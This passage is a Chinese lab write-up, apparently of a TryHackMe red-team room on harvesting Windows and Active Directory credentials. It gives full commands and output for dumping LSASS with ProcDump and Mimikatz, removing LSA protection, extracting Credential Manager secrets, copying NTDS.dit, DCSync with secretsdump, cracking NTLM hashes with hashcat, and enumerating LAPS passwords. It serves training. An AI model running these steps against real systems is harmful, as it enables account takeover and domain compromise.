ATT&amp;CK框架中定义为“操作系统凭据转储:LSASS内存(T1003)”。 使用图形用户界面(GUI) 如果我们要使用计算机的GUI来转储任何正在运行的Windows进程，那么我们需要先打开任务管理器，然后在详细信息选项卡中找到所需的进程，右键单击它并选择“创建转储文件”。 注：这里我点击发现没有权限，以管理员身份也不行 在上述转储过程完成之后，目标机器将显示一个弹出消息，其中会包含已经转储的文件的路径，我们可以找到并复制该文件然后将它传输到我们的攻击机以离线提取其中的NTLM哈希值。 注意：如果目标机器的LSASS进程是受保护状态，那么我们在运行上述转储操作时会得到一个错误提示，除非我们成功修改与LSASS进程相关的注册表值。 我们也可以将上述所转储的进程相关文件复制到目标机器的Mimikatz文件夹下，然后再使用Mimikatz来处理LSASS进程的内存转储。 C:\\Users\\Administrator&gt;copy C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\2\\lsass.DMP C:\\Tools\\Mimikatz\\lsass.DMP 1 file(s) copied. #然后再使用MimiKatz来读取密码信息 #注意：要以管理员用户身份在目标机器上运行cmd C:\\Tools\\Mimikatz&gt; mimikatz.exe mimikatz # privilege::debug mimikatz # sekurlsa::minidump lsass.DMP mimikatz # sekurlsa::logonpasswords 使用系统内部套件 如果我们无法使用目标机器的GUI，那么我们也可以尝试使用ProcDump来转储进程，ProcDump是一个可以在命令行界面运行的系统内部进程转储实用程序。在与本文实验相关的目标机器中，系统内部套件的安装路径如下：C:\\Tools\\SysinternalsSuite。 我们可以指定一个正在运行的进程，在本例中是lsass.exe，然后像下面这样转储与进程相关的内存信息： #在目标机器上使用procdump.exe转储LSASS进程的内存信息 #从lsass.exe进程的内存中转储出用户账户和密码，并保存为离线版的lsass.dmp文件。 C:\\&gt; C:\\Tools\\SysinternalsSuite\\procdump.exe -accepteula -ma lsass.exe c:\\Tools\\Mimikatz\\lsass_dump-1.dmp ProcDump v10.0 - Sysinternals process dump utility Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [09:09:33] Dump 1 initiated: c:\\Tools\\Mimikatz\\lsass_dump-1.dmp [09:09:33] Dump 1 writing: Estimated dump file size is 162 MB. [09:09:34] Dump 1 complete: 163 MB written in 0.4 seconds [09:09:34] Dump count reached. 注意：我们在转储进程时需要写入内容到计算机磁盘，而且因为转储LSASS进程是攻击者常用的一种已知技术，所以，目标计算机上的反病毒软件产品可能会将我们的转储操作标记为恶意；也就是说，在现实环境中转储LSASS进程时，我们可能还需要尝试绕过目标机器上的反病毒程序。 然后再继续使用MimiKatz来读取密码信息： #注意：要以管理员用户身份在目标机器上运行cmd C:\\Tools\\Mimikatz&gt; mimikatz.exe mimikatz # privilege::debug mimikatz # sekurlsa::minidump lsass_dump-1.dmp mimikatz # sekurlsa::logonpasswords 使用MimiKatz Mimikatz是一个著名的工具，它常被用于从指定内存中提取密码、哈希、PIN和Kerberos票据等敏感信息。Mimikatz是一种后渗透工具，能够支持很多有用的攻击，例如哈希传递、票据传递以及构建Kerberos黄金票据等。Mimikatz可以处理目标操作系统的内存来尝试访问其中所包含的敏感信息，因此，该工具还需要攻击者具有目标机器的管理员权限或者系统权限才能成功转储内存、提取凭据。 我们可以使用Mimikatz工具来提取目标机的lsass.exe进程的内存转储，在本文相关的实验环境中，我们可以通过目标机器的c:\\Tools\\Mimikatz路径找到该工具。 目标机器上的LSASS进程是以SYSTEM权限运行的，因此，为了获取到用户的密码哈希值，我们需要具有目标机器的系统权限或者本地管理员权限。我们可以通过RDP界面在目标机器上以管理员身份运行并打开CMD，然后再执行mimikatz二进制文件，相关命令如下所示： C:\\Tools\\Mimikatz&gt; mimikatz.exe .#####. mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # 成功加载mimikatz之后，我们需要先检查一下当前权限以便确认我们能否进行内存访问，命令如下： #检查当前用于访问内存的权限 mimikatz # privilege::debug Privilege '20' OK 完成权限检查之后，我们可以使用以下命令来提取lsass.exe进程的内存中所存储的密码信息(如果目标LSASS进程是受保护状态，以下命令则无法成功执行)：（我这里是执行不成功的，以下是成功示例） mimikatz # sekurlsa::logonpasswords Authentication Id : 0 ; 515377 (00000000:0007dd31) Session : RemoteInteractive from 3 User Name : Administrator Domain : THM Logon Server : CREDS-HARVESTIN Logon Time : 6/3/2022 8:30:44 AM SID : S-1-5-21-1966530601-3185510712-10604624-500 msv : [00000003] Primary * Username : Administrator * Domain : THM * NTLM : 98d3a787a80d08385cea7fb4aa2a4261 * SHA1 : 64a137cb8178b7700e6cffa387f4240043192e72 * DPAPI : bc355c6ce366fdd4fd91b54260f9cf70 ... 在上述命令的输出结果中，Mimikatz会为我们列出很多关于目标机器的账户信息，我们可以在上面的输出结果中检查Administrator用户的Primary部分，然后我们就能看到管理员用户所对应的NTLM密码哈希。 注意：如果我们要成功获取到目标用户的密码哈希值，那么目标用户(受害者)必须已经登录过目标系统，并且该用户的凭据也已经被目标机所缓存。 受保护的LSASS进程 在2012年，微软引入了LSA保护机制，它能防止LSASS进程被恶意访问，这能尽量避免攻击者从LSASS进程的相关内存中提取凭据。 接下来，我们将学习如何禁用目标机器中的LSA保护并使用Mimikatz从LSASS进程的内存中提取凭据；如果我们想要让LSASS进程处于受保护状态，我们可以将注册表中的RunAsPPL DWORD的值修改为1(相关的注册表路径HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa)。 我们在针对受保护的LSASS进程执行sekurlsa::logonpasswords命令时，会收到如下所示的错误结果： #由于LSA保护机制，我们无法成功提取LSASS进程的内存中所存储的密码信息。 mimikatz # sekurlsa::logonpasswords ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) 直接执行上述命令会向我们返回0x00000005错误代码(Access Denied)。幸运的是，Mimikatz针对此类情况为我们提供mimidrv.sys驱动程序，该程序可以在系统内核级别工作以禁用LSA保护。 #使用 !+ 将mimidrv导入Mimikatz，即将mimidrv驱动程序加载到当前内存中。 mimikatz # !+ [*] 'mimidrv' service not present [+] 'mimidrv' service successfully registered [+] 'mimidrv' service ACL to everyone [+] 'mimidrv' service started 注意：如果上述导入操作失败并出现isFileExist错误，那么我们可以先退出当前的mimikatz界面，然后再次加载C:\\Tools\\Mimikatz\\mimikatz.exe并再次运行上述导入命令。（如果依旧错误，那就确定自身当前目录是否与mimikatz.exe在同一目录下） 成功加载好mimidrv驱动程序之后，我们可以通过执行以下Mimikatz命令来禁用当前机器(也就是目标机器)的LSA保护： mimikatz # !processprotect /process:lsass.exe /remove Process : lsass.exe PID 840 -&gt; 00/00 [0-0-0] 然后，我们就可以继续执行sekurlsa::logonpasswords命令来提取lsass.exe进程的内存中所存储的密码信息。 0x06 Windows凭据管理器 在本小节中，我们将了解Windows凭据管理器，并尝试利用它来转储系统凭据。 什么是凭据管理器？ 凭据管理器是Windows的一个功能，它可用于存储网站、应用程序和域网络的登录敏感信息(如登录凭据、用户名、密码和internet地址等)。与Windows凭据管理器相关的凭据类别有四种： Web凭据：包含存储在互联网浏览器中或者其他应用程序中的身份验证详细信息。 Windows凭据：包含Windows身份验证的详细信息，例如NTLM身份验证或者Kerberos身份验证。 通用凭据：包含基本身份验证的详细信息，例如明文用户名和密码。 基于证书的凭据：包含基于证书的身份验证详细信息。 注意：身份验证详细信息会存储在目标用户的文件夹中，而不会在Windows用户帐户之间共享，但是，这些身份验证信息还会被缓存在计算机内存中。 访问凭据管理器 我们可以通过GUI界面(控制面板-&gt;用户帐户-&gt;凭据管理器)或者命令提示符界面来访问Windows凭据管理器，本小节将重点介绍使用命令提示符的场景。 在cmd界面中，我们将使用vaultcmd实用程序来查看Microsoft凭据管理器，如下所示，我们可以先使用命令来列出windows目标机中当前可用的凭据库信息： #列出凭据管理器中的可用凭据 C:\\Users\\Administrator&gt; vaultcmd /list Currently loaded vaults: Vault: Web Credentials Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Vault: Windows Credentials Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29 Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault tips：如上面的输出结果所示，在默认情况下，Windows有两个凭据库，一个用于保存Web凭据，另一个用于保存Windows机器凭据。 接下来，让我们通过运行带有/listproperties的vaultcmd命令来检查Web凭据库中是否已经存储了凭据信息： #检查“Web凭据库”中是否存储了凭据：存储了凭据或者没有存储凭据。 C:\\Users\\Administrator&gt; VaultCmd /listproperties:\"Web Credentials\" Vault Properties: Web Credentials Location: C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Vault\\4BF4C442-9B8A-41A0-B380-DD4A704DDB28 Number of credentials: 1 Current protection method: DPAPI 成功确认Web凭据库中存储了凭据之后，我们可以继续列出上述Web凭据库中所存储凭据的详细信息： #列出“Web凭据库”中的凭据详细信息 C:\\Users\\Administrator&gt; VaultCmd /listcreds:\"Web Credentials\" Credentials in vault: Web Credentials Credential schema: Windows Web Password Credential Resource: internal-app.thm.red Identity: THMUser Saved By: MSEdge Hidden: No Roaming: Yes 使用PowerShell脚本转储凭据 我们可以使用PowerShell脚本如Get-WebCredentials.ps1来尝试转储Windows凭据管理器中的凭据，为了方便起见，PS脚本已经放置在目标机器上的C:\\Tools\\目录中。 我们先确保使用绕过策略来执行PowerShell，然后再将Get-WebCredentials.ps1作为模块导入，具体命令如下所示： #使用脚本获取web凭据相关的明文信息 C:\\Users\\Administrator&gt; powershell -ex bypass Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\\Users\\Administrator&gt; Import-Module C:\\Tools\\Get-WebCredentials.ps1 PS C:\\Users\\Administrator&gt; Get-WebCredentials UserName Resource Password Properties -------- -------- -------- ---------- THMUser internal-app.thm.red Password! {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], [application, MSEdge]} 根据上面的输出结果显示，我们获得了用于访问内部应用程序的用户名和密码信息。 用户名：THMuser 密码：E4syPassw0rd 使用runas转储并利用凭据 利用已存储凭据的另一种方法是使用RunAs。RunAs是一个命令行内置工具，它允许攻击者在不同用户权限下运行Windows应用程序或工具。RunAs工具有各种可以在Windows系统中使用的命令参数。/savecred参数允许我们在Windows凭据管理器(在Windows凭据库部分下)中保存用户的凭据。因此，当我们下次以同一用户身份执行runas命令时将不会被要求输入密码进行验证。 我们还可以使用cmdkey来枚举目标机器中所存储的凭据，它是一种用于创建、删除和显示计算机已存储的Windows凭据的工具，我们可以使用/list命令参数来显示当前机器所有已经存储的Windows凭据，或者使用/list:computername命令参数来显示指定的凭据信息： #枚举当前机器已经存储的Windows凭据 C:\\Users\\thm&gt; cmdkey /list Currently stored credentials: Target: LegacyGeneric:target=10.10.237.226 Type: Generic User: thm Target: Domain:interactive=thm.red\\thm-local Type: Domain Password User: thm.red\\thm-local 上面的输出结果显示我们有一个已经存储的thm.red\\thm-local用户的域帐户密码。注意，目标机器中已经存储的凭据也可以用于访问其他域内服务器。现在让我们使用runas命令作为thm-local本地用户来执行Windows应用程序。 #使用/savecred命令参数以本地用户身份运行cmd.exe应用程序 C:\\Users\\thm&gt; runas /savecred /user:THM.red\\thm-local cmd.exe Attempting to start cmd.exe as user \"THM.red\\thm-local\" ... 这将为我们弹出一个新的cmd.exe命令提示符界面，我们可以在这个命令提示符界面中运行whoami 命令来确认我们当前的用户身份，然后根据以下路径找到flag并回答本小节的任务问题。 C:\\Users\\thm-local\\Saved Games\\flag.txt 使用Mimikatz转储凭据 我们还可以使用Mimikatz工具来转储凭据，它可以从当前计算机的内存中转储保存在Windows凭据管理器中的明文密码： #使用Mimikatz工具针对Windows凭据管理器进行内存转储 C:\\Users\\Administrator&gt; c:\\Tools\\Mimikatz\\mimikatz.exe .#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59 .## ^ ##. \"A La Vie, A L'Amour\" - (oe.eo) ## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \\ / ## &gt; http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' &gt; http://pingcastle.com / http://mysmartlogon.com ***/ mimikatz # privilege::debug Privilege '20' OK mimikatz # sekurlsa::credman 本小节中所讨论的技术也可以通过使用其他工具(如Empire、Metasploit等)来完成，请自行扩展。 使用Mimikatz针对存储在Windows凭据库中的10.10.237.226 SMB共享进行内存凭据转储，最终我们得到的密码是什么? C:\\Users\\Administrator&gt; c:\\Tools\\Mimikatz\\mimikatz.exe mimikatz # privilege::debug Privilege '20' OK mimikatz # vault::cred /patch 0x07 域控制器中的凭据 本小节将讨论在本地和远程转储域控制器(DC)中的密码哈希所需的操作步骤。 NTDS 域控制器 新技术目录服务(NTDS-New Technologies Directory Services)是一个包含所有Active Directory数据的数据库，该数据库包括AD对象、属性、凭据等。NTDS. DTS数据库文件中的数据主要由以下三个表组成： 架构表(Schema table)：包含对象的类型及其关系。 链接表：包含对象的属性及其属性值。 数据类型：包含用户和组。 NTDS数据库在Windows计算机中的默认路径为C:\\Windows\\NTDS，而且该数据库会经过加密处理以防止攻击者直接从目标计算机中提取数据。在通常情况下，用户不被允许从正在运行的计算机上直接访问NTDS.dit数据库文件，因为该文件将由相关的Active Directory使用并会被锁定。 然而，攻击者仍然有各种方法可以访问目标计算机中的NTDS.dit数据库文件。本小节将讨论如何使用ntdsutil和Diskshadow工具来获得NTDS文件的副本，以及如何转储该文件所包含的内容。需要注意的是，在解密NTDS文件时，我们还需要一个系统引导密钥来尝试解密由LSA所隔离的凭据，该凭据存储在SECURITY文件系统中；因此，我们还必须转储包含所有需要解密的文件的security文件。 Ntdsutil介绍 Ntdsutil是一个Windows实用程序，主要用于管理和维护Active Directory配置，它可以在各种场景中使用，例如： 恢复活动目录(Active Directory)中已删除的对象。 执行针对AD数据库的维护措施。 活动目录(Active Directory)快照管理。 设置目录服务还原模式(DSRM-Directory Services Restore Mode)的管理员密码。 有关Ntdsutil的更多信息，请访问Microsoft的相关官方文档页面。 本地转储(攻击者无凭据) 如果我们作为攻击者没有可用的凭据，但是拥有对目标域控制器(DC)的管理员访问权限，那么我们通常可以尝试执行本地转储操作。我们将依靠Windows实用程序来转储NTDS文件并离线破解它们。首先，假设在本次实验中我们具有对目标域控制器的管理员访问权限。 要成功转储NTDS文件的内容，我们还需要在目标域控制器中获取以下文件： C:\\Windows\\NTDS tds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY 下面是一行PowerShell命令，作用是使用Ntdsutil工具将NTDS文件转储到目标机器中的C:\\temp目录下。 #从受害机器(目标DC机器)中转储NTDS文件的内容 #通过RDP或者直接访问Tryhackme所提供的浏览器页面来操作目标机器，以管理员用户身份在目标机上启动cmd.exe并执行以下命令 C:\\Users\\thm&gt; powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\" #在命令提示符界面下调用ntdsutil.exe工具,导出Active Directory域控制器的NTDS.dit数据库备份文件。 #具体分析如下: #ntdsutil.exe:ntdsutil.exe是Windows中的一个工具，可用于管理Active Directory数据库。 #'ac i ntds':这是ntdsutil.exe工具中的命令，用于连接Active Directory。 #'ifm':进入控制台交互界面。 #'create full c:\\temp':执行备份操作，创建完整的NTDS.dit数据库的副本文件到c:\\temp目录下。 #q q:退出ntdsutil.exe工具。 现在，如果我们检查目标机器中的c:\\temp目录，我们将会看到两个文件夹：Active Directory和registry，其中包含了我们所需要的三个文件。 我们可以将所需的上述三个文件传输到我们的攻击机中，然后再运行secretsdump.py脚本从我们所转储的内存文件中提取密码哈希值。 #在攻击机上针对目标机使用SCP命令完成文件传输，其中远程目标机在以下命令中的表示格式为THM\\\\thm@MACHINE_IP或者THM.red\\\\thm@MACHINE_IP #在使用SCP命令处理带空格的文件路径时要在空格前额外添加“\\\\\\”。 scp THM\\\\thm@10.10.63.254:C:/temp/registry/SECURITY /tmp/ scp THM\\\\thm@10.10.63.254:C:/temp/registry/SYSTEM /tmp/ scp THM\\\\thm@10.10.63.254:c:/temp/Active\\\\\\ Directory/ntds.dit /tmp/ #Password：Passw0rd! #在攻击机上从本地NTDS文件中提取哈希值 python3 /impacket/examples/secretsdump.py -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit local python3 ./impacket/examples/secretsdump.py -sam /tmp/SECURITY -system /tmp/SYSTEM -ntds /tmp/ntds.dit local Impacket v0.12.0.dev1+20240130.154745.97007e84 - Copyright 2023 Fortra [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) [-] SAM hashes extraction failed: 'NoneType' object is not subscriptable [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c [*] Reading and decrypting hashes from /tmp/ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:18d4f9b55f0e4cf0aa9d57998433b7f2::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: thm.red\\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: thm.red\\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207::: thm.red\\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666::: [*] Kerberos keys from /tmp/ntds.dit Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30 Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0 Administrator:des-cbc-md5:6d34e608f8574632 CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:26cde2aa6599210f99ebbde586d7c21c9181248298bc4648fb773ecd1b0f057b CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:6e1ab8804fac1ef56fc9761c1b1ddd62 CREDS-HARVESTIN$:des-cbc-md5:860ed037c4467a13 krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3 krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c krbtgt:des-cbc-md5:d92ffd4abf02b049 thm.red\\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca thm.red\\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c thm.red\\thm:des-cbc-md5:794f3889e646e383 thm.red\\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac thm.red\\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529 thm.red\\victim:des-cbc-md5:457cdc673d3b0d85 thm.red\\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26 thm.red\\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf thm.red\\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4 thm.red\\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f thm.red\\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6 thm.red\\admin:des-cbc-md5:32a8a201d3080b2f thm.red\\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d thm.red\\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d thm.red\\svc-thm:des-cbc-md5:f8e57c49f7dc671c thm.red\\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e thm.red\\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546 thm.red\\bk-admin:des-cbc-md5:108cc2b0d3100767 thm.red\\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660 thm.red\\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64 thm.red\\test-user:des-cbc-md5:aec8e3325b85316b sshd:aes256-cts-hmac-sha1-96:07046594c869e3e8094de5caa21539ee557b4d3249443e1f8b528c4495725242 sshd:aes128-cts-hmac-sha1-96:e228ee34b8265323725b85c6c3c7d85f sshd:des-cbc-md5:b58f850b4c082cc7 [*] Cleaning up... 目标系统的引导密钥值为：0x36c8d26ec0df8b23ce63bcefa6e2d821 bk-admin用户的NTLM密码哈希值为：thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: 我们可以使用hashcat对bk-admin用户的密码哈希进行解密： root@hekeats$ nano hash.txt #thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: root@hekeats$ hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/passwords/rockyou.txt bk-admin用户的密码明文为：Passw0rd123 远程转储(攻击者有凭据) 我们刚才讨论了如何在没有凭据的情况下从目标DC的内存中获取哈希，接下来，我们将展示如何远程转储目标系统和域控制器中的哈希值，这需要我们拥有相关凭据，例如密码或NTLM哈希值。我们还需要拥有对目标域控制器具有管理及访问权限的用户或者使用下文的DC Sync部分内容中所讨论的具有特殊权限的凭据。 DC Sync(DC同步) DC Sync是攻击者会在Active Directory环境中执行的一种常用攻击方式，目的是远程转储凭据。当攻击者获得具有以下AD权限的帐户(具有必要权限的特殊帐户)或者目标网络环境中的AD admin帐户被攻破时，此类攻击就可能会发生： Replicating Directory Changes Replicating Directory Changes All Replicating Directory Changes in Filtered Set 攻击者可以利用上述这些AD配置来执行域复制，通常也被称为“DC Sync”或域控制器同步。有关DC Sync攻击的更多信息，可以尝试访问以下博客内容： 【THM】Persisting Active Directory(AD域权限维持)-红队 滥用DCSync介绍-知乎 接下来，我们将使用Impacket SecretsDump脚本工具来演示DC同步攻击： #在攻击机上针对目标DC执行域控制器同步攻击 #注意：请使用`THM.red/thm`作为与本小节练习相关的Active Directory用户，因为该用户具有管理员权限。 python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP python3 /opt/impacket/examples/secretsdump.py -just-dc THM.red/thm@10.10.63.254 #Password：Passw0rd! 让我们进一步解释一下上述命令： -just-dc 命令参数用于指定提取目标DC中的NTDS文件。 thm.red/AD_Admin_User 命令参数是经过身份验证的域用户(格式为domain/user)。 注意，如果我们只想转储目标DC中所存储的NTLM密码哈希值，那么我们可以使用-just-dc-ntlm参数来指定，命令如下所示： #执行DC Sync攻击以转储NTLM密码哈希 #注意：请使用`THM.red/thm`作为与本小节练习相关的Active Directory用户，因为该用户具有管理员权限。 python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/&lt;AD_Admin_User&gt;@MACHINE_IP python3 /opt/impacket/examples/secretsdump.py -just-dc-ntlm THM.red/thm@10.10.63.254 #Password：Passw0rd! 当我们获取到目标用户的NTLM哈希之后，我们就可以基于已获取的NTLM哈希来模拟相关的特定用户身份或者使用类似于hashcat的破解工具来破解哈希值。我们可以使用-m 1000模式来破解Windows NTLM哈希： #先将要破解的密码哈希值存储到hash.txt文件中 hashcat -m 1000 -a 0 hash.txt /path/to/wordlist/passwords/rockyou.txt 0x08 LAPS(本地管理员密码解决方案) 本小节将讨论如何在已经配置并启用了LAPS(本地管理员密码解决方案)功能的Active Directory环境中枚举和获取目标机的本地管理员密码。 组策略首选项(GPP) Windows操作系统有内置管理员(built-in Administrator)帐户，用户可以使用密码对其进行访问。对于攻击者而言，在具有许多计算机的大型Windows环境中更改密码更加有挑战性，因此，攻击者可以尝试基于Microsoft实现一种使用组策略首选项(GPP)来跨工作站更改本地管理员帐户的方法。 GPP(组策略首选项)是一种允许管理员创建具有嵌入式凭据的域策略的工具。一旦部署了GPP，就会在目标机器的SYSVOL文件夹中创建不同的XML文件，SYSVOL是Active Directory的一个重要组件，它可以在NTFS卷上创建一个共享目录，所有经过身份验证的域用户都能够以可读权限来访问该共享目录。 与GPP相关的XML文件还将包含一个使用AES-256位加密算法进行加密处理的密码，这种加密技术足够好，直到微软官方以某种方式在MSDN上公布了它的私钥。由于域用户可以读取SYSVOL文件夹的内容，因此攻击者对该文件夹中所存储的密码进行解密变得很容易。 tips：破解SYSVOL的加密密码的工具之一是Get-GPPPassword脚本。 本地管理员密码解决方案(LAPS)介绍 在2015年，微软删除了Windows计算机在SYSVOL文件夹中存储加密密码的功能，引入了本地管理员密码解决方案(LAPS)，LAPS能够提供一种更安全的方法来远程管理Windows机器上的本地管理员密码。 LAPS方法将在AD环境中包含计算机对象的两个新属性(ms-mcs-AdmPwd和ms-mcs-AdmPwdExpirationTime)，其中ms-mcs-AdmPwd属性包含本地管理员的明文密码，而ms-mcs-AdmPwdExpirationTime属性则包含密码过期时间。 tips：LAPS将使用admpwd.dll修改本地管理员密码，并会更新相关的ms-mcs-AdmPwd的值。 枚举LAPS 首先，我们可以检查目标计算机中是否安装了LAPS，这可以通过检查admpwd.dll路径来完成(查看AdmPwd.dll文件是否存在)： C:\\Users\\thm&gt;dir \"C:\\Program Files\\LAPS\\CSE\" Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of C:\\Program Files\\LAPS\\CSE 06/06/2022 01:01 PM &lt;DIR&gt; . 06/06/2022 01:01 PM &lt;DIR&gt; .. 05/05/2021 07:04 AM 184,232 AdmPwd.dll 1 File(s) 184,232 bytes 2 Dir(s) 10,342,387,712 bytes free 上述的输出结果能够确认目标机器上有LAPS，接下来让我们检查AdmPwd cmdlet的可用命令，如下所示： #列出可用于枚举LAPS的PowerShell cmdlet #powershell -ex bypass PS C:\\Users\\thm&gt; Get-Command *AdmPwd* CommandType Name Version Source ----------- ---- ------- ------ Cmdlet Find-AdmPwdExtendedRights 5.0.0.0 AdmPwd.PS Cmdlet Get-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Reset-AdmPwdPassword 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdAuditing 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdComputerSelfPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdReadPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Set-AdmPwdResetPasswordPermission 5.0.0.0 AdmPwd.PS Cmdlet Update-AdmPwdADSchema 5.0.0.0 AdmPwd.PS 接下来，我们需要找到哪个AD组织单元(OU)具有处理LAPS的“所有扩展权限”属性，我们将使用“Find-AdmPwdExtendedRights”cmdlet并附加我们所需要检查的组织单元(OU)。 注意：获取可用OU可以在我们执行枚举步骤时完成，本例中的目标OU是THMorg，我们还可以使用-Identity *参数来列出所有可用的OU。 #查找具有AdmPwdExtendedRights属性的用户 PS C:\\Users\\thm&gt; Find-AdmPwdExtendedRights -Identity THMorg ObjectDN ExtendedRightHolders -------- -------------------- OU=THMorg,DC=thm,DC=red {THM\\LAPsReader} 上面输出显示在THMorg中的LAPsReader组对于LAPS具有正确的访问权限，让我们来检查一下这个组及其成员。 #查找属于LAPsReader组的用户 PS C:\\Users\\thm&gt; net groups \"LAPsReader\" Group name LAPsReader Comment Members ------------------------------------------------------------------------------- bk-admin The command completed successfully. PS C:\\Users\\thm&gt; net user bk-admin User name bk-admin Full Name THM Admin BK Comment User's comment Country/region code 000 (System Default) Account active Yes Account expires Never Password last set 6/4/2022 10:33:48 AM Password expires Never Password changeable 6/5/2022 10:33:48 AM Password required Yes User may change password Yes Workstations allowed All Logon script User profile Home directory Last logon 6/9/2022 3:47:28 PM Logon hours allowed All Local Group Memberships Global Group memberships *Domain Users *Domain Admins *LAPsReader *Enterprise Admins The command completed successfully. 获取密码 通过上述枚举操作，我们可以发现bk-admin用户是LAPsReader组的成员，因此为了获得目标LAPS中所存储的密码，我们需要入侵或冒充bk-admin用户。在找到正确的用户之后，我们就可以通过向启用了LAPS的目标计算机使用Get-AdmPwdPassword命令来获取LAPS中所存储的密码。 #使用正确的用户来获取目标LAPS中所存储的密码 PS C:\\&gt; Get-AdmPwdPassword -ComputerName creds-harvestin ComputerName DistinguishedName Password ExpirationTimestamp ------------ ----------------- -------- ------------------- CREDS-HARVESTIN CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red *************** 